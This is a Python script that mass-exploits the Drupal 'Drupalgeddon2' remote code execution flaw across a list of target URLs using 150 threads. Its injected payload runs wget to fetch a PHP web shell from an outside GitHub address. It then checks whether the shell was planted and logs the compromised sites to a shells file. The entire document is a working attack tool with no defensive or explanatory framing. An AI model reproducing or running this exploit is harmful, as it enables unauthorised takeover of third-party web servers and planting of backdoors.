#!/usr/bin/env
import sys
import requests
from multiprocessing.dummy import Pool

requests.urllib3.disable_warnings()

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    exit('Usage: d.py list.txt')

payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'wget https://raw.githubusercontent.com/dr-iman/SpiderProject/master/lib/exploits/web-app/wordpress/ads-manager/payload.php'}
headers = {'User-Agent': 'Mozilla 5.0'}

def run(u):
    try:
        url = u + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' 
        r = requests.post(url, data=payload, verify=False, headers=headers)
        if 'Select Your File :' in requests.get(u+'/payload.php', verify=False, headers=headers).text:
            print ('\n\aUploaded:', u + '/payload.php\n')
            with open('drupals_shells.txt', mode='a') as d:
                d.write(u + '/payload.php\n')
        else:
            print(u, " -> Not exploitable")
    except:
        pass

mp = Pool(150)
mp.map(run, target)
mp.close()
mp.join()
